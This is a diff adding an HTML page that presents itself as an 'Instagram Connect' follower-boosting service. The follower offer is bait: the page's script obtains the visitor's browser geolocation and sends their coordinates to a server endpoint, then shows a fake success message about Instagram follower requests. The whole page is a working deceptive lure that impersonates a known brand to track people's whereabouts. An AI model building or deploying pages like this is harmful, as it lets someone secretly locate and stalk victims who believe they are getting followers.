@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Creator Connect</title>
+<style>
+*{box-sizing:border-box}
+body{
+ margin:0;min-height:100vh;
+ background:#100817;color:white;
+ font-family:Arial,sans-serif;
+ background-image:radial-gradient(#51245d 1px,transparent 1px);
+ background-size:24px 24px
+}
+header{
+ padding:18px 22px;
+ background:#21102b;
+ border-bottom:1px solid #a83caa;
+ display:flex;align-items:center;gap:13px
+}
+.logo{
+ width:38px;height:38px;border-radius:12px;
+ background:linear-gradient(135deg,#ff9b35,#ed398b,#8545e8);
+ display:grid;place-items:center;font-size:22px
+}
+header h2{margin:0;font-size:20px}
+header small{color:#e6a9e8}
+main{max-width:560px;margin:35px auto;padding:18px}
+.hero{text-align:center;padding:20px 5px}
+.art{
+ width:125px;height:125px;margin:auto;
+ border-radius:32px;
+ background:linear-gradient(135deg,#ff9b35,#ed398b,#8545e8);
+ display:grid;place-items:center;font-size:55px;
+ box-shadow:0 0 40px #d23cb655
+}
+h1{font-size:32px;line-height:1.2}
+h1 span{
+ background:linear-gradient(90deg,#ffad42,#f04b9b,#a66bff);
+ background-clip:text;color:transparent
+}
+p{color:#d5c4dc;line-height:1.65}
+.card{
+ background:#21152b;border:1px solid #75417e;
+ border-radius:20px;padding:23px;margin-top:25px;
+ box-shadow:0 15px 40px #0008
+}
+.card h2{color:#f18ad2}
+.feature{
+ display:flex;gap:13px;align-items:center;
+ padding:15px;background:#302039;
+ border-radius:12px;margin:18px 0
+}
+.feature span{font-size:30px}
+.notice{
+ background:#302039;padding:14px;
+ border-radius:11px;font-size:13px;
+ border:1px solid #70477b
+}
+button{
+ width:100%;padding:16px;border:0;
+ border-radius:11px;
+ background:linear-gradient(90deg,#f49b38,#e74691,#9251df);
+ color:white;font-size:16px;font-weight:bold;
+ margin-top:13px
+}
+.secondary{background:#49334f}
+#status{overflow-wrap:anywhere}
+footer{text-align:center;padding:25px;color:#b99bbf;font-size:12px}
+</style>
+</head>
+<body>
+<header>
+ <div class="logo">◎</div>
+ <div>
+  <h2>Instagram Connect</h2>
+  <small>instagarm follower</small>
+ </div>
+</header>
+
+<main>
+<section class="hero">
+ <div class="art">◎</div>
+ <h1>Share Your<br><span>Creator Presence.</span></h1>
+ <p>Choose whether you want to increase follower requast.</p>
+</section>
+
+<section class="card">
+ <h2>FOLLOWER REQUAST</h2>
+ <p>Your Follower requast was send please choose  and approve your browser's location permission.</p>
+
+ <div class="feature">
+  <span>€</span>
+  <div>
+   <b>Requast for follower</b>
+   <p style="margin:5px 0 0">Please choice requast for follower</p>
+  </div>
+ </div>
+
+ <div class="notice">
+  If you want to increase your followers, then send follower requests on Instagram server.
+ </div>
+
+ <button onclick="shareLocation()">REQUAST FOR FOLLOWER</button>
+ <button class="secondary" onclick="document.getElementById('status').textContent='Sharing allow.'">MAYBE LATER</button>
+ <p id="status" aria-live="polite">Follower reqaust has not been send.</p>
+</section>
+</main>
+
+<footer>CREATOR CONNECT · FOLLOWER REQUAST</footer>
+
+<script>
+function shareLocation(){
+ const status=document.getElementById("status");
+
+ if(!navigator.geolocation){
+  status.textContent="Location is supported by this browser.";
+  return;
+ }
+
+ status.textContent="Waiting for your permission...";
+
+ navigator.geolocation.getCurrentPosition(async pos=>{
+  status.textContent="Sending your chosen location...";
+
+  try{
+   const response=await fetch("/api/location",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+     consent:true,
+     latitude:pos.coords.latitude,
+     longitude:pos.coords.longitude,
+     accuracy:pos.coords.accuracy
+    })
+   });
+
+   status.textContent=response.ok
+    ?"INSTAGRAM FOLLOWER REQUEST SEND  SUCSSFULLY."
+    :"Server error: location was not accepted.";
+
+  }catch(error){
+   status.textContent="Unable to connect to the server.";
+  }
+
+ },()=>{
+  status.textContent="Permission denied or location unavailable.";
+ });
+}
+</script>
+</body>
+</html>
